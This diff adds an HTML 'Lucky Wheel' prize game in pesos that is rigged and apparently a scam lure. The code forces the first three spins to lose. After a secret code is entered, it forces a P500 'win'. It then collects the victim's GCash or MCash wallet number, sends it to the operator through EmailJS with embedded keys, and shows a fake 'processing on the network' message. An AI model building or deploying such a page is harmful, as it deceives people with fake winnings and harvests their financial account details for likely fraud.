@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Wheel of Fortune | Neon Edition</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+        
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #020617;
+            color: #f1f5f9;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            margin: 0;
+            background-image: radial-gradient(circle at 50% 50%, #1e293b 0%, #020617 100%);
+        }
+
+        .page-wrapper {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            width: 100%;
+            padding: 1rem;
+            justify-content: space-evenly;
+            align-items: center;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 80vw;
+            height: 80vw;
+            max-width: 400px;
+            max-height: 400px;
+        }
+
+        .wheel-outer-decoration {
+            position: absolute;
+            inset: -10px;
+            border-radius: 50%;
+            border: 2px solid rgba(59, 130, 246, 0.5);
+            background: #0f172a;
+            box-shadow: 0 0 30px rgba(37, 99, 235, 0.3), inset 0 0 20px rgba(37, 99, 235, 0.2);
+            z-index: 1;
+        }
+
+        .led-ring {
+            position: absolute;
+            inset: -5px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            border-top-color: #3b82f6;
+            animation: spin 3s linear infinite;
+            z-index: 2;
+            opacity: 0.5;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .pointer {
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 28px;
+            height: 38px;
+            z-index: 100;
+            filter: drop-shadow(0 0 10px #3b82f6);
+        }
+
+        .pointer svg {
+            fill: #fff;
+            stroke: #3b82f6;
+            stroke-width: 2;
+        }
+
+        .btn-spin {
+            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+            color: white;
+            box-shadow: 0 0 20px rgba(37, 99, 235, 0.5);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+        }
+
+        .btn-spin:hover:not(:disabled) {
+            transform: scale(1.03);
+            box-shadow: 0 0 30px rgba(37, 99, 235, 0.8);
+        }
+
+        .btn-spin:disabled {
+            background: #1e293b !important;
+            opacity: 0.6;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        #wheel-canvas {
+            position: relative;
+            z-index: 10;
+            border-radius: 50%;
+            width: 100%;
+            height: 100%;
+        }
+
+        .wheel-center-hub {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            background: radial-gradient(circle at 30% 30%, #1e293b, #020617);
+            border: 2px solid #3b82f6;
+            border-radius: 50%;
+            z-index: 20;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.6);
+        }
+
+        .panel-backdrop {
+            background: rgba(2, 6, 23, 0.9);
+            backdrop-filter: blur(8px);
+        }
+
+        .panel-hidden {
+            display: none !important;
+        }
+
+        .shake {
+            animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+        }
+
+        @keyframes shake {
+            10%, 90% { transform: translate3d(-1px, 0, 0); }
+            20%, 80% { transform: translate3d(2px, 0, 0); }
+            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+            40%, 60% { transform: translate3d(4px, 0, 0); }
+        }
+        
+        .method-btn.active {
+            border-color: #3b82f6;
+            background: rgba(59, 130, 246, 0.1);
+            color: #3b82f6;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ENTRANCE SYSTEM -->
+<div id="entrance-system" class="fixed inset-0 z-[200] flex items-center justify-center p-6 bg-slate-950/98 backdrop-blur-xl">
+    <div class="bg-slate-900 border border-slate-800 w-full max-w-[320px] p-6 rounded-[2rem] text-center shadow-2xl">
+        <div id="entrance-initial">
+            <h2 class="text-xl font-black text-white mb-2 uppercase italic leading-tight">Congratulations<br><span class="text-blue-500">Winner</span></h2>
+            <p class="text-slate-400 text-[9px] mb-6 font-bold uppercase tracking-widest">You have <span class="text-blue-500">FREE SPINS</span> waiting</p>
+            <button id="claim-btn" class="btn-spin w-full py-4 rounded-xl text-xs font-black uppercase tracking-widest">START NOW</button>
+        </div>
+
+        <div id="entrance-code-entry" class="hidden">
+            <h2 class="text-lg font-black text-white mb-1 uppercase italic">Authentication</h2>
+            <p class="text-slate-400 text-[9px] mb-5 font-bold uppercase tracking-widest">Provide your authorized access code</p>
+            <div id="entrance-code-container" class="relative mb-5">
+                <input type="text" id="entrance-code-input" placeholder="Access Code" class="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-center text-xs font-black text-white outline-none focus:border-blue-500 uppercase">
+                <p id="entrance-code-error" class="hidden text-red-500 text-[9px] font-black uppercase mt-2">Invalid Code</p>
+            </div>
+            <button id="verify-access-btn" class="btn-spin w-full py-4 rounded-xl text-xs font-black uppercase tracking-widest">UNLOCK WHEEL</button>
+        </div>
+    </div>
+</div>
+
+<div class="page-wrapper">
+    <div class="text-center">
+        <h1 class="text-4xl md:text-5xl font-black tracking-tighter text-white uppercase italic leading-none drop-shadow-[0_0_15px_rgba(59,130,246,0.3)]">
+            LUCKY <span class="text-blue-500">WHEEL</span>
+        </h1>
+    </div>
+
+    <div class="wheel-container">
+        <div class="pointer"><svg viewBox="0 0 24 30"><path d="M12 30L2 10C2 5 6 0 12 0s10 5 10 10L12 30z" /></svg></div>
+        <div class="wheel-outer-decoration"></div>
+        <div class="led-ring"></div>
+        <div class="wheel-center-hub"></div>
+        <canvas id="wheel-canvas"></canvas>
+    </div>
+
+    <div class="w-full max-w-[280px] flex flex-col items-center gap-4">
+        <button id="spin-btn" class="btn-spin w-full py-4 rounded-xl text-lg font-black uppercase tracking-widest">SPIN NOW</button>
+    </div>
+</div>
+
+<!-- SURPRISE BONUS PANEL -->
+<div id="bonus-panel" class="fixed inset-0 z-[500] panel-backdrop flex items-center justify-center p-6 panel-hidden">
+    <div class="bg-slate-900 border border-slate-800 w-full max-w-[320px] p-6 rounded-[2rem] text-center shadow-2xl">
+        <div class="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center mx-auto mb-3 border border-blue-500/20">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+            </svg>
+        </div>
+        <h2 class="text-lg font-black text-white mb-1 uppercase italic">Wait! Surprise!</h2>
+        <p class="text-slate-400 text-[9px] mb-5 font-bold uppercase tracking-widest leading-relaxed">System override detected. Enter private bypass code for <span class="text-blue-500">FINAL CHANCE</span></p>
+        
+        <div id="code-container" class="relative mb-5">
+            <input type="text" id="bonus-code-input" placeholder="Secret Code" class="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-center text-xs font-black text-white outline-none focus:border-blue-500 uppercase">
+            <p id="code-error" class="hidden text-red-500 text-[9px] font-black uppercase mt-2">Access Denied</p>
+        </div>
+
+        <button id="verify-bonus-btn" class="btn-spin w-full py-4 rounded-xl text-xs font-black uppercase tracking-widest">UNLOCK FINAL SPIN</button>
+    </div>
+</div>
+
+<!-- RESULT OVERLAY -->
+<div id="result-overlay" class="fixed inset-0 z-[400] panel-backdrop flex items-center justify-center p-6 panel-hidden">
+    <div class="bg-slate-900 border border-slate-800 w-full max-w-[320px] p-6 rounded-[2rem] text-center shadow-2xl">
+        <div id="win-state">
+            <div id="status-icon-container" class="w-14 h-14 bg-blue-500/10 text-blue-400 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg id="status-icon" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7" /></svg>
+            </div>
+            <p id="result-badge" class="text-[8px] font-black text-blue-500 uppercase tracking-[0.4em] mb-1">Status</p>
+            <h2 id="winner-name" class="text-3xl font-black text-white mb-1 tracking-tighter">---</h2>
+            <p id="result-description" class="text-slate-400 text-[10px] mb-8">---</p>
+            <button id="continue-to-claim" class="btn-spin w-full py-4 rounded-xl font-black uppercase text-[10px] tracking-widest">CLAIM REWARD</button>
+        </div>
+
+        <div id="claim-state" class="hidden text-left">
+            <div class="flex gap-2 mb-4">
+                <button id="method-gcash-btn" class="method-btn active flex-1 py-2 rounded-lg font-black text-[8px] uppercase border-2 border-slate-700">GCash</button>
+                <button id="method-mcash-btn" class="method-btn flex-1 py-2 rounded-lg font-black text-[8px] uppercase border-2 border-slate-700">MCash</button>
+            </div>
+            <input type="text" id="wallet-number" maxlength="11" placeholder="Wallet Number" class="w-full p-3 bg-slate-950 border border-slate-800 rounded-xl text-center text-lg font-black text-white mb-4 outline-none focus:border-blue-500">
+            <button id="submit-claim" class="btn-spin w-full py-4 rounded-xl font-black uppercase text-[10px]">CONFIRM WITHDRAWAL</button>
+        </div>
+
+        <div id="success-state" class="hidden py-2 text-center">
+            <div class="text-green-500 text-5xl mb-4">✓</div>
+            <h3 class="text-xl font-black text-white mb-1 italic uppercase">Sent!</h3>
+            <p class="text-[9px] text-slate-400 mb-6 px-4">Processing on the network...</p>
+            <button id="final-close-btn" class="w-full py-3 bg-slate-800 text-slate-200 rounded-xl font-black uppercase text-[9px]">FINISH</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Reset session storage on page load to ensure fresh start on refresh
+    window.onload = function() {
+        sessionStorage.clear();
+        // Also optionally clear the specific localStorage items used for this app
+        localStorage.removeItem('neon_spin_count');
+        localStorage.removeItem('neon_is_special');
+        localStorage.removeItem('neon_unlocked');
+        localStorage.removeItem('neon_spin_lock_v2');
+        
+        drawWheel();
+        // Since we clear everything, we show the entrance system
+        document.getElementById('entrance-system').classList.remove('panel-hidden');
+    };
+
+    const EMAILJS_PUBLIC_KEY = "6kFJ7rx7NPWfm4hFb";
+    const EMAILJS_SERVICE_ID = "service_8iwx4ft";
+    const EMAILJS_TEMPLATE_ID = "template_w33uyv9";
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    const canvas = document.getElementById('wheel-canvas');
+    const ctx = canvas.getContext('2d');
+    const spinBtn = document.getElementById('spin-btn');
+    const resultOverlay = document.getElementById('result-overlay');
+    
+    let entries = ["P100", "P250", "P500", "P1,000", "Try Again", "Better Luck"];
+    let startAngle = (Math.PI * 1.5) - (3 * (Math.PI * 2 / 6)) - (Math.PI * 2 / 6 / 2);
+    let isSpinning = false, spinTime = 0, spinTimeTotal = 8000; 
+    let initialAngle = 0, totalRotation = 0;
+    let currentPrize = "", selectedMethod = "GCash";
+    let confettiLoop = null;
+
+    const celebrationColors = [
+        '#3b82f6', '#ec4899', '#8b5cf6', '#fbbf24', '#10b981', '#ffffff'
+    ];
+
+    let spinCount = 0;
+    let isSpecialUser = false;
+
+    const neonColors = [
+        ["#2563eb", "#1d4ed8", "#3b82f6"], ["#db2777", "#be185d", "#f472b6"], 
+        ["#059669", "#047857", "#10b981"], ["#d97706", "#b45309", "#fbbf24"], 
+        ["#7c3aed", "#6d28d9", "#a78bfa"], ["#dc2626", "#b91c1c", "#f87171"]
+    ];
+
+    function drawWheel() {
+        const dpr = window.devicePixelRatio || 1;
+        const rect = canvas.getBoundingClientRect();
+        canvas.width = rect.width * dpr;
+        canvas.height = rect.height * dpr;
+        ctx.scale(dpr, dpr);
+        const cx = rect.width / 2, cy = rect.height / 2, radius = rect.width / 2;
+        const arc = (Math.PI * 2) / entries.length;
+        ctx.clearRect(0, 0, rect.width, rect.height);
+        entries.forEach((text, i) => {
+            const angle = startAngle + i * arc;
+            const colorPair = neonColors[i % neonColors.length];
+            ctx.save();
+            ctx.beginPath();
+            ctx.moveTo(cx, cy);
+            ctx.arc(cx, cy, radius, angle, angle + arc);
+            const grad = ctx.createRadialGradient(cx, cy, 0, cx, cy, radius);
+            grad.addColorStop(0, colorPair[1]);
+            grad.addColorStop(0.8, colorPair[0]);
+            grad.addColorStop(1, '#000');
+            ctx.fillStyle = grad;
+            ctx.fill();
+            ctx.strokeStyle = colorPair[2]; ctx.lineWidth = 1; ctx.stroke();
+            ctx.translate(cx, cy); ctx.rotate(angle + arc / 2); ctx.fillStyle = "white";
+            let fontSize = rect.width / 18; ctx.font = `900 ${fontSize}px 'Plus Jakarta Sans'`;
+            ctx.textAlign = "right"; ctx.fillText(text.toUpperCase(), radius * 0.88, fontSize / 3.5);
+            ctx.restore();
+        });
+    }
+
+    function startPersistentConfetti() {
+        if (confettiLoop) return;
+        const defaults = { startVelocity: 25, spread: 360, ticks: 60, zIndex: 9999 };
+        confettiLoop = setInterval(function() {
+          confetti(Object.assign({}, defaults, { 
+            particleCount: 2, origin: { x: Math.random(), y: Math.random() - 0.2 }, colors: celebrationColors, scalar: 0.8
+          }));
+          confetti(Object.assign({}, defaults, { 
+            particleCount: 1, origin: { x: 0, y: 0.8 }, angle: 60, colors: celebrationColors 
+          }));
+          confetti(Object.assign({}, defaults, { 
+            particleCount: 1, origin: { x: 1, y: 0.8 }, angle: 120, colors: celebrationColors 
+          }));
+        }, 400);
+    }
+
+    function triggerWinSequence() {
+        const blastCount = 5;
+        const interval = 700;
+        for(let i = 0; i < blastCount; i++) {
+            setTimeout(() => {
+                confetti({
+                    particleCount: 120, spread: 80, origin: { y: 0.6 }, colors: celebrationColors, zIndex: 9999, scalar: 1.1, drift: (Math.random() - 0.5) * 2
+                });
+            }, i * interval);
+        }
+        startPersistentConfetti();
+    }
+
+    function rotateWheel() {
+        spinTime += 16;
+        if (spinTime >= spinTimeTotal) {
+            isSpinning = false;
+            const degrees = (startAngle * 180 / Math.PI);
+            const arcDeg = 360 / entries.length;
+            const index = Math.floor((360 - (degrees + 90) % 360) % 360 / arcDeg);
+            currentPrize = entries[index];
+            const isWin = !currentPrize.toLowerCase().includes("luck") && !currentPrize.toLowerCase().includes("again");
+            
+            document.getElementById('winner-name').textContent = currentPrize;
+            if (isWin) {
+                triggerWinSequence();
+                document.getElementById('continue-to-claim').classList.remove('hidden');
+                document.getElementById('result-badge').textContent = "Congrats! You Win";
+                document.getElementById('result-description').textContent = "Network authorization confirmed.";
+                lockInterface();
+            } else {
+                document.getElementById('continue-to-claim').classList.add('hidden');
+                document.getElementById('result-badge').textContent = "";
+                if (currentPrize === "Try Again") {
+                    document.getElementById('result-description').textContent = "Keep Going! You still have 1 more spin.";
+                    setTimeout(hideOverlay, 2500); 
+                } else if (currentPrize === "Better Luck") {
+                    document.getElementById('result-description').textContent = "Ooops! Better luck next time.";
+                    if (spinCount >= 3 && !isSpecialUser) {
+                        spinBtn.disabled = true; spinBtn.textContent = "OUT OF SPINS";
+                        setTimeout(() => {
+                            hideOverlay();
+                            setTimeout(() => { document.getElementById('bonus-panel').classList.remove('panel-hidden'); }, 3000);
+                        }, 2000);
+                    } else { setTimeout(hideOverlay, 2500); }
+                } else {
+                    document.getElementById('result-description').textContent = isSpecialUser ? "Wait for instructions." : "Try again!";
+                    setTimeout(hideOverlay, 2500);
+                }
+            }
+            resultOverlay.classList.remove('panel-hidden');
+            return;
+        }
+        const t = spinTime / spinTimeTotal;
+        const ease = 1 - Math.pow(1 - t, 4);
+        startAngle = initialAngle + (totalRotation * ease);
+        drawWheel(); requestAnimationFrame(rotateWheel);
+    }
+
+    function lockInterface() { 
+        spinBtn.disabled = true; 
+        spinBtn.textContent = "CLAIMED"; 
+    }
+    
+    function hideOverlay() { 
+        resultOverlay.classList.add('panel-hidden'); 
+    }
+
+    document.getElementById('claim-btn').onclick = () => {
+        document.getElementById('entrance-initial').classList.add('hidden');
+        document.getElementById('entrance-code-entry').classList.remove('hidden');
+    };
+
+    document.getElementById('verify-access-btn').onclick = () => {
+        const val = document.getElementById('entrance-code-input').value.trim().toLowerCase();
+        if (val === "goodluck") {
+            document.getElementById('entrance-system').classList.add('panel-hidden');
+        } else {
+            const cont = document.getElementById('entrance-code-container');
+            cont.classList.add('shake'); setTimeout(() => cont.classList.remove('shake'), 400);
+            document.getElementById('entrance-code-error').classList.remove('hidden');
+        }
+    };
+
+    document.getElementById('verify-bonus-btn').onclick = () => {
+        const val = document.getElementById('bonus-code-input').value.trim().toLowerCase();
+        if (val === "goodluck") {
+            isSpecialUser = true;
+            document.getElementById('bonus-panel').classList.add('panel-hidden');
+            spinBtn.disabled = false; 
+            spinBtn.textContent = "FINAL SPIN"; 
+        } else {
+            const cont = document.getElementById('code-container');
+            cont.classList.add('shake'); setTimeout(() => cont.classList.remove('shake'), 400);
+            document.getElementById('code-error').classList.remove('hidden');
+        }
+    };
+
+    document.getElementById('method-gcash-btn').onclick = () => {
+        selectedMethod = "GCash";
+        document.getElementById('method-mcash-btn').classList.remove('active');
+        document.getElementById('method-gcash-btn').classList.add('active');
+    };
+    document.getElementById('method-mcash-btn').onclick = () => {
+        selectedMethod = "MCash";
+        document.getElementById('method-gcash-btn').classList.remove('active');
+        document.getElementById('method-mcash-btn').classList.add('active');
+    };
+    document.getElementById('continue-to-claim').onclick = () => {
+        document.getElementById('win-state').classList.add('hidden');
+        document.getElementById('claim-state').classList.remove('hidden');
+    };
+    document.getElementById('submit-claim').onclick = async () => {
+        const val = document.getElementById('wallet-number').value.trim();
+        if (val.length < 10) return;
+        const btn = document.getElementById('submit-claim');
+        btn.disabled = true; btn.textContent = "PROCESSING...";
+        try {
+            const templateParams = { prize: currentPrize, method: selectedMethod, user_number: val };
+            const response = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+            if(response.status === 200) {
+                document.getElementById('claim-state').classList.add('hidden');
+                document.getElementById('success-state').classList.remove('hidden');
+            } else { throw new Error("Failed"); }
+        } catch(e) { console.error(e); btn.disabled = false; btn.textContent = "RETRY"; }
+    };
+    
+    document.getElementById('final-close-btn').onclick = () => {
+        hideOverlay();
+        lockInterface();
+        startPersistentConfetti();
+    };
+
+    spinBtn.onclick = () => { 
+        if(isSpinning || spinBtn.disabled) return; 
+        spinCount++;
+        isSpinning = true; spinTime = 0; initialAngle = startAngle;
+        const arc = (Math.PI * 2) / entries.length;
+        let targetIndex = -1;
+        if (spinCount === 1 || spinCount === 2) targetIndex = entries.indexOf("Try Again");
+        else if (spinCount === 3) targetIndex = entries.indexOf("Better Luck");
+        else if (isSpecialUser) targetIndex = entries.indexOf("P500");
+        const extraSpins = Math.PI * 2 * 12;
+        if (targetIndex !== -1) {
+            const currentMod = startAngle % (Math.PI * 2);
+            const targetPos = (Math.PI * 1.5) - (targetIndex * arc) - (arc / 2);
+            totalRotation = extraSpins + (targetPos - currentMod);
+            while (totalRotation < extraSpins) totalRotation += Math.PI * 2;
+        } else { totalRotation = extraSpins + Math.random() * Math.PI * 2; }
+        rotateWheel(); 
+    };
+
+    window.onresize = drawWheel;
+</script>
+</body>
+</html>
